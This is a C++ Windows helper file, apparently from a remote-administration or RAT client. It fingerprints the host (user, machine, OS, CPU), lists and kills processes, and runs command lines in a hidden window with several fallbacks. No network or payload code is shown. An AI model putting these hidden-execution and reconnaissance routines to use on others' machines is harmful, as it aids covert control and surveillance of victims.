#include "misc.hpp"

void printHex(const char* data, int length) {
	std::cout << std::hex << std::setfill('0'); // Establece la base hexadecimal y el relleno con ceros

	for (int i = 0; i < length; ++i) {
		// Imprime cada byte en hexadecimal
		std::cout << std::setw(2) << static_cast<int>(static_cast<unsigned char>(data[i])) << " ";
	}

	std::cout << std::dec << std::endl; // Restablece la base decimal
}

std::string RandomID(int iLongitud) {
	const char* Map = "abcdefghijklmnopqrstuvwxyz1234567890-";
	std::string strSalida = "";

	std::random_device rd;
	std::mt19937 gen(rd());

	std::uniform_int_distribution<> dis(0, 36);

	for (int i = 0; i < iLongitud; i++) {
		int random_number = dis(gen);
		strSalida += Map[random_number];
	}
	return strSalida;
}

std::string strUserName() {
	std::string strOutput = "";
	char cUser[UNLEN + 1];
	char cMachineName[100];
	DWORD dLen = UNLEN + 1;
	if (GetUserName(cUser, &dLen) != 0) {
		strOutput = cUser;
	}
	else {
		strOutput = "unknown";
	}
	dLen = 100;
	if (GetComputerName(cMachineName, &dLen)) {
		strOutput.append(1, '@');
		strOutput += cMachineName;
	}
	else {
		strOutput = "@unknown";
	}

	return strOutput;
}

std::string strOS() {
	std::string strOut = "";
	HKEY hKey;
	auto ret = RegOpenKeyEx(HKEY_LOCAL_MACHINE, TEXT("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion"), 0, KEY_QUERY_VALUE, &hKey);
	if (ret != ERROR_SUCCESS) {
		DebugPrint("RegOpenKeyEx ERR");
		return strOut;
	}
	DWORD dLen = 50;
	LPBYTE lBuffer[50];
	if (RegQueryValueEx(hKey, "ProductName", nullptr, nullptr, (LPBYTE)&lBuffer, &dLen) == ERROR_SUCCESS) {
		strOut.append((const char*)lBuffer);
	}else {
		DebugPrint("Unable to retrieve product name");
		strOut = "Windows :v";
	}
	RegCloseKey(hKey);
	return strOut;
}

std::vector<std::string> strSplit(const std::string& strString, char cDelimiter, int iMax) {
	std::vector<std::string> vcOut;
	int istrLen = static_cast<int>(strString.size()), iIt = 0, iCounter = 0, iTmp = 0;
	for (; iIt < istrLen; iIt++) {
		std::string strTmp = "";
		while (strString[iIt] != cDelimiter && strString[iIt] != '\0') {
			strTmp.append(1, strString[iIt++]);
			iCounter++;
		}
		iCounter = 0;
		vcOut.push_back(strTmp);
		if (++iTmp == iMax) { break; }

	}
	return vcOut;
}

std::string strCpu() {
	std::string strOut = "";
	int CPUInfo[4] = { -1 };
	char CPUBrandString[200];
	__cpuid(CPUInfo, 0x80000000);
	u_int nExIds = CPUInfo[0];
	memset(CPUBrandString, 0, sizeof(CPUBrandString));
	for (u_int i = 0x80000000; i <= nExIds; ++i) {
		__cpuid(CPUInfo, i);
		if (i == 0x80000002) {
			memcpy(CPUBrandString, CPUInfo, sizeof(CPUInfo));
		}
		else if (i == 0x80000003) {
			memcpy(CPUBrandString + 16, CPUInfo, sizeof(CPUInfo));
		}
		else if (i == 0x80000004) {
			memcpy(CPUBrandString + 32, CPUInfo, sizeof(CPUInfo));
		}
	}
	strOut = CPUBrandString;
	
	SYSTEM_INFO sInfo;
	GetNativeSystemInfo(&sInfo);
	switch (sInfo.wProcessorArchitecture) {
	case 9:
		strOut += "x64 (AMD or INTEL)";
		break;
	case 5:
		strOut += "ARM";
		break;
	case 12:
		strOut += "ARM64";
		break;
	case 6:
		strOut += "Intel Itanium-based";
		break;
	case 0:
		strOut += "x86";
		break;
	default:
		strOut += "Unknow";
		break;
	}

	return strOut;
}

u64 GetFileSize(c_char* cPath) {
	std::ifstream strmInputFile(cPath, std::ios::binary);
	if (!strmInputFile.is_open()) {
		return 0;
	}
	std::filebuf* pBuf = strmInputFile.rdbuf();
	u64 uTmp = 0;
	uTmp = pBuf->pubseekoff(0, strmInputFile.end, strmInputFile.in);
	pBuf->pubseekpos(0, strmInputFile.in);
	strmInputFile.close();
	return uTmp;
}

bool Execute(const char *cCmdLine, int iOpt){
	if(iOpt == 0){
		DebugPrint("[EXEC] Oculto");
	}
	PROCESS_INFORMATION pi;
	STARTUPINFO si;
	ZeroMemory( &si, sizeof(si) );
	si.cb = sizeof(si);
	//GetStartupInfo(&si);
	si.dwFlags = STARTF_USESHOWWINDOW;
	si.wShowWindow = iOpt == 1 ? SW_SHOW : SW_HIDE;
	char cCmd[1024];
	strncpy_s(cCmd, cCmdLine, 1022);
	cCmd[1022] = '\0';
	
	int iRet = CreateProcess(nullptr, cCmd, nullptr, nullptr, false, (iOpt == 1 ? NORMAL_PRIORITY_CLASS|DETACHED_PROCESS : CREATE_NO_WINDOW | NORMAL_PRIORITY_CLASS|DETACHED_PROCESS), nullptr, nullptr, &si, &pi);
	if(iRet != 0){
		return true;
	} else {
		DebugPrint("CreateProcess error");
	}
	SHELLEXECUTEINFO sei;
	sei.cbSize = sizeof(SHELLEXECUTEINFO);
	sei.fMask = SEE_MASK_DEFAULT;
	sei.lpVerb = "open";
	sei.lpFile = cCmdLine;
	sei.hwnd = nullptr;
	sei.lpParameters = nullptr;
	sei.lpDirectory = nullptr;
	sei.hInstApp = nullptr;
	sei.nShow = iOpt == 1 ? SW_SHOW : SW_HIDE;
	if(ShellExecuteEx(&sei) > 32){
		return true;
	} else {
		DebugPrint("ShellExecuteEx error");
	}
	if(WinExec(cCmdLine, iOpt == 1 ? SW_SHOW : SW_HIDE) > 31){
		return true;
	}
	return false;
}

void DebugPrint(const std::string strMsg, int iValor) {
#ifdef ___DEBUG_
	std::cout << strMsg <<' '<<iValor<<'\n';
#endif
}

bool EndProcess(int iPID) {
	HANDLE hProc = OpenProcess(PROCESS_TERMINATE, false, iPID);
	if (!hProc) {
		return false;
	}

	if (!TerminateProcess(hProc, 1)) {
		return false;
	}

	CloseHandle(hProc);

	return true;
}

std::string strProcessList() {
	std::string strOut = "";
	WTS_PROCESS_INFO* pWPIs = NULL;
	SID_NAME_USE pSID_NAME;
	DWORD dwProcCount = 0;
	if (WTSEnumerateProcesses(WTS_CURRENT_SERVER_HANDLE, 0, 1, &pWPIs, &dwProcCount))
	{
		for (DWORD i = 0; i < dwProcCount; i++)
		{
			char cName[256];
			char cHost[256];
			DWORD cName_Size = sizeof(cName);
			DWORD cHost_Size = sizeof(cHost);

			strOut += std::to_string(pWPIs[i].ProcessId);
			strOut.append(1, '>');
			strOut += pWPIs[i].pProcessName;
			strOut.append(1, '>');

			if (LookupAccountSidA(nullptr, pWPIs[i].pUserSid, cName, &cName_Size, cHost, &cHost_Size, &pSID_NAME)) {
				strOut += cHost;
				strOut.append(1, '/');
				strOut += cName;
			}else {
				strOut += "0";
			}

			HANDLE pHandle = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pWPIs[i].ProcessId);
			if (pHandle != NULL) {
				TCHAR szFileName[MAX_PATH];
				if(GetModuleFileNameEx(pHandle, NULL, szFileName, MAX_PATH) > 0){
				//if(GetProcessImageFileNameA(pHandle, szFileName, sizeof(szFileName))> 0){
					strOut += ">";
					strOut += szFileName;
				}else {
					strOut += ">-";
				}
				CloseHandle(pHandle);
				pHandle = NULL;
			} else {
				strOut += ">-";
			}

			strOut.append(1, '|');
		}
	}

	//Free memory
	if (pWPIs)
	{
		WTSFreeMemory(pWPIs);
		pWPIs = nullptr;
	}

	return strOut.substr(0, strOut.size()-1);
}
